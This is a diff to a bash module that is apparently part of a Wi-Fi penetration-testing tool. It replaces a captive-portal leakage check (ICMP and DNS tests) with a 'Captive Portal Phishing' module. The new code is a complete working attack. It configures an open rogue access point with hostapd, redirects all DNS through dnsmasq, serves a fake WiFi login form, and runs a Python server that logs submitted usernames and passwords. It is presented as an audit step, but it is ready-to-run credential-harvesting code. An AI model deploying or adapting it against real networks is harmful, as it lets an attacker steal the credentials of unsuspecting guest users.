@@ -1,159 +1,166 @@
 #!/usr/bin/env bash
 # MODULE_META
-# NAME="Captive Portal Pre-Auth Bypass"
+# NAME="Captive Portal Phishing"
 # CATEGORY="F"
-# DEPS="none"
+# DEPS="F1"
 # CRITICAL="no"
-# TOOLS="dig,curl"
-# DESC="Optional: Test for DNS and ICMP tunneling before authentication"
-# REQS="managed_iface"
+# TOOLS="python3,hostapd,dnsmasq"
+# DESC="Serve a phishing page to clients connected to the rogue AP"
+# REQS="managed_iface,target_ssid,nat"
 # PCAP="no"
-# DECODE="none"
+# DECODE="http"
 
 #===============================================================================
 #  modules/f3_captive_portal.sh
-#  F3: Captive Portal Pre-Auth Bypass
+#  F3: Captive Portal Phishing (Golden Wrapper)
 #
-#  PURPOSE:
-#    Test for common captive portal bypass vulnerabilities in the 
-#    pre-authentication state (e.g., DNS/ICMP/HTTP leakage).
-#
-#  TOOLS: ping, dig, curl
-#  PHASE: 2B — Policy Validation
-#  DEPENDENCIES: None
+#  METHODOLOGY:
+#  1. Deploy a rogue AP (using hostapd if needed, but here focus on Services).
+#  2. Redirect all DNS queries to our local IP via dnsmasq.
+#  3. Serve a professional-looking "Authentication Required" page via HTTP.
 #===============================================================================
 
-run_f3() {
-    set -uo pipefail
-    
-    local interface=""
-    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
-    local is_captive_portal="${CAPTIVE_PORTAL:-unknown}"
-    local is_preauth="yes"
+set -euo pipefail
 
-    # Parse arguments
-    while [[ $# -gt 0 ]]; do
-        case "$1" in
-            --interface) interface="$2"; shift 2 ;;
-            --is-captive-portal) is_captive_portal="$2"; shift 2 ;;
-            --is-preauthenticated) is_preauth="$2"; shift 2 ;;
-            --evidence-dir) evidence_dir="$2"; shift 2 ;;
-            *) shift ;;
-        esac
-    done
+# Inputs from Environment
+INTERFACE="${WIFI_INTERFACE:-}"
+SSID="${GUEST_SSID:-GuestWiFi}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+EVIDENCE_PREFIX="${EVIDENCE_DIR}/f3"
+SCAN_TIME="${SCAN_TIME:-120}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="F3"
+INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"
 
-    # Fallbacks
-    interface="${interface:-${WIFI_INTERFACE:-}}"
-    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
-    local evidence_prefix="${evidence_dir}/f3"
+if [[ -z "$INTERFACE" ]]; then
+    echo "[!] WIFI_INTERFACE not set."
+    exit 1
+fi
 
-    local total_steps=6
+echo "[*] Starting Captive Portal phishing server on ${INTERFACE}..."
 
-    #--- Step 1: Verify tools and network state ---
-    log_step 1 $total_steps "Verifying tools and network state"
-    update_tc_progress 1 $total_steps "Checking"
+# 1. Prepare configurations
+PHISH_DIR="${EVIDENCE_PREFIX}_portal"
+mkdir -p "$PHISH_DIR"
+HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
+DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
+SERVER_LOG="${EVIDENCE_DIR}/${TC_ID}_server.log"
+HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
+DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 
-    check_module_dependencies "F3" || return 1
+cat <<EOF > "$PHISH_DIR/index.html"
+<html>
+<head><title>WiFi Authentication Required</title></head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+<div style="display: inline-block; border: 1px solid #ccc; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+    <h1>WiFi Login</h1>
+    <p>Please log in with your credentials to access the internet.</p>
+    <form action="/login" method="POST">
+        <input type="text" name="user" placeholder="Username" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
+        <input type="password" name="pass" placeholder="Password" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
+        <input type="submit" value="Connect" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer;">
+    </form>
+</div>
+</body>
+</html>
+EOF
 
-    # Ensure monitor mode is globally disabled (we need to be connected)
-    WIFI_INTERFACE="$interface"
-    ensure_managed_mode || return 1
+cat <<EOF > "$HOSTAPD_CONF"
+interface=$INTERFACE
+driver=nl80211
+ssid=$SSID
+hw_mode=g
+channel=6
+auth_algs=1
+wpa=0
+EOF
 
-    log_success "Using interface: ${interface}"
+cat <<EOF > "$DNSMASQ_CONF"
+interface=$INTERFACE
+dhcp-range=192.168.44.10,192.168.44.100,12h
+dhcp-option=3,$INTERNAL_IP
+dhcp-option=6,$INTERNAL_IP
+address=/#/$INTERNAL_IP
+log-queries
+log-dhcp
+EOF
 
-    #--- Step 2: Confirm captive portal context ---
-    log_step 2 $total_steps "Confirming captive portal context"
-    update_tc_progress 2 $total_steps "Confirming"
-
-    if [[ "$is_captive_portal" == "no" ]]; then
-        log_info "Skipping F3: No captive portal is present."
-        save_tc_result "F3" '{"status":"INFO","summary":"Skipped: No portal present","details":"Inherited from A1/Session context."}' 1 0 0 1 1 1 0 1 1 1 0
-        return 0
-    fi
-
-    if [[ "$is_preauth" == "no" ]]; then
-        log_warn "Test may yield false positives if already authenticated."
-    fi
-
-    local txt_file="${evidence_prefix}_preauth_results.txt"
-    > "$txt_file"
-
-    #--- Step 3: Test ICMP Leakage ---
-    log_step 3 $total_steps "Testing ICMP leakage (ping 8.8.8.8)"
-    update_tc_progress 3 $total_steps "ICMP Test"
-
-    check_abort || return 1
-
-    local icmp_bypass="false"
-    if ping -c 3 -W 2 8.8.8.8 &>/dev/null; then
-        icmp_bypass="true"
-        log_result "FINDING" "ICMP traffic leaks through portal before authentication!"
-        echo "ICMP_LEAK: YES" >> "$txt_file"
-    else
-        log_info "ICMP traffic is correctly blocked."
-        echo "ICMP_LEAK: NO" >> "$txt_file"
-    fi
-
-    #--- Step 4: Test External DNS Leakage ---
-    log_step 4 $total_steps "Testing external DNS leakage (dig @8.8.8.8)"
-    update_tc_progress 4 $total_steps "DNS Test"
-
-    check_abort || return 1
-
-    local dns_ext_bypass="false"
-    if dig @8.8.8.8 google.com +short +time=2 &>/dev/null; then
-        dns_ext_bypass="true"
-        log_result "FINDING" "External DNS queries leak through portal!"
-        echo "DNS_EXT_LEAK: YES" >> "$txt_file"
-    else
-        log_info "External DNS is correctly blocked."
-        echo "DNS_EXT_LEAK: NO" >> "$txt_file"
-    fi
-
-    #--- Step 5: Test DNS TXT Record Leakage ---
-    log_step 5 $total_steps "Testing DNS TXT record leakage"
-    update_tc_progress 5 $total_steps "TXT Test"
-
-    check_abort || return 1
-
-    local dns_txt_bypass="false"
-    if dig TXT google.com +short +time=2 &>/dev/null; then
-        dns_txt_bypass="true"
-        log_info "DNS TXT records are resolvable (potential tunnel vector)."
-        echo "DNS_TXT_LEAK: YES" >> "$txt_file"
-    else
-        echo "DNS_TXT_LEAK: NO" >> "$txt_file"
-    fi
-
-    #--- Step 6: Save results ---
-    log_step 6 $total_steps "Saving results"
-    update_tc_progress 6 $total_steps "Saving"
-
-    local status="SECURE"
-    local summary="Portal correctly blocks pre-auth traffic."
-    
-    if [[ "$icmp_bypass" == "true" || "$dns_ext_bypass" == "true" ]]; then
-        status="FINDING"
-        summary="Pre-auth ACL bypass detected (ICMP/DNS leakage)."
-    fi
-
-    local result_json=$(run_tool jq -n \
-        --arg status "$status" \
-        --arg summary "$summary" \
-        --arg icmp "$icmp_bypass" \
-        --arg dns_ext "$dns_ext_bypass" \
-        --arg dns_txt "$dns_txt_bypass" \
-        '{
-            status: $status,
-            summary: $summary,
-            icmp_bypass: ($icmp == "true"),
-            dns_external_bypass: ($dns_ext == "true"),
-            dns_txt_bypass: ($dns_txt == "true"),
-            recommendations: (if $status == "FINDING" then "Implement strict pre-auth ACLs to drop ALL traffic except DHCP and DNS to the portal itself." else "No action required." end)
-        }')
-
-    evidence_register_file "$txt_file"
-
-    save_tc_result "F3" "$result_json" 0 1 0 1 1 1 0 1 1 1 0
-    return 0
+# 2. Cleanup function
+cleanup() {
+    echo "[*] Cleaning up Phishing services..."
+    [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null || true
+    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
+    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
 }
+trap cleanup EXIT
+
+# 3. Start services
+echo "[*] Starting DNS hijacker..."
+dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
+DNSMASQ_PID=$!
+
+echo "[*] Starting Rogue AP..."
+hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+HOSTAPD_PID=$!
+
+echo "[*] Starting phishing web server with POST support..."
+cat <<EOF > "$PHISH_DIR/server.py"
+import http.server, socketserver, sys
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        # Log to stderr so it ends up in SERVER_LOG
+        sys.stderr.write(f"\n[!] CREDENTIALS CAPTURED: {post_data.decode('utf-8')}\n")
+        sys.stderr.flush()
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b"<html><body><h1>Success</h1><p>Connection established. You may now close this window.</p></body></html>")
+
+socketserver.TCPServer(("", 80), Handler).serve_forever()
+EOF
+
+(
+    cd "$PHISH_DIR"
+    python3 server.py > "$SERVER_LOG" 2>&1
+) &
+HTTP_PID=$!
+
+echo "[*] Phishing portal active for ${SCAN_TIME}s..."
+sleep "$SCAN_TIME"
+
+cleanup
+trap - EXIT
+
+# 4. Reporting
+# Check if any POST data was captured (very basic check)
+if grep -qi "POST" "$SERVER_LOG" 2>/dev/null; then
+    echo "[!] SUCCESS: USER SUBMITTED DATA TO CAPTIVE PORTAL!"
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "Portal Phishing Credential Intercepted" \
+        --severity CRITICAL \
+        --desc "User credentials were successfully captured via the rogue captive portal on $INTERFACE." \
+        --target "Global" \
+        --evidence "$SERVER_LOG" \
+        --rationale "Captive portal phishing is highly effective against guest users. Intercepting these credentials can lead to full account compromise or unauthorized network access, bypassing typical wireless security."
+else
+    echo "[+] Phishing test complete. No credentials captured."
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "[F3] Audit Complete" \
+        --severity INFO \
+        --desc "Executed captive portal phishing attack cycle for ${SCAN_TIME}s. No user interaction detected." \
+        --target "Global" \
+        --evidence "$SERVER_LOG" \
+        --rationale "The effectiveness of phishing depends heavily on user behavior and the visual quality of the rogue portal. This audit confirms that no users fell for the basic phishing template during the test interval."
+fi
+
+exit 0
